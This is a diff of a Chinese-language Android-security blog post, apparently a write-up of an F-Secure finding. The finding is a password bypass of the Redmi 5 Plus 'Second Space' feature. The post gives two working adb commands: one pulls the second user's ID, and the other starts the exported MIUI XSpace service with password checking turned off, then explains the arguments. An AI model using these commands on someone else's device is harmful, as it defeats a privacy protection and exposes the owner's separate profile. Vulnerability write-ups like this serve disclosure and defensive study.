@@ -3,6 +3,7 @@ layout: post
 title:  "REDMI 5 Plus Second Space Password Bypass"
 date:   2020-06-10 18:00:00 +520
 categories: Android_Security
+tags: [Framework, LogicBug, ExportedComponent]
 ---
 
 这个漏洞来自F-Secure实验室
@@ -21,13 +22,13 @@ Second Space的中文版本叫作`手机分身`
 这个漏洞的作用，就是让攻击者不需要密码，也可以进入分身，并且在主系统与分身之间自由切换
 
 一共两条命令
-```
+```shell
 ➜ SECOND_USER=`adb shell pm list users | grep -o "{[0-9]*" | tr -d '{' | tail -n 1`
 ➜ adb shell am start-service --ez params_check_password False --ei params_target_user_id $SECOND_USER -a com.miui.xspace.TO_CHANGE_USER
 ```
 
 第一条命令用于查询当前手机里的用户，`| grep -o "{[0-9]*" | tr -d '{' | tail -n 1`用于过滤出`11`这个字段
-```
+```shell
 ➜ adb shell pm list users
 Users:
 	UserInfo{0:机主:13} running
@@ -35,7 +36,7 @@ Users:
 ```
 
 第二条命令可以说是最为关键，我们对其进行参数拆分
-```
+```shell
 adb shell am start-service // 通过ADB命令启动Service
     --ez params_check_password False // boolean类型参数
     --ei params_target_user_id $SECOND_USER // int类型参数
